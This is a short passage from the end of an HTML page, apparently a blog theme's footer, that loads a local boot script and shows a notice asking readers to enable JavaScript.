<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
  </noscript>
</body>
</html>
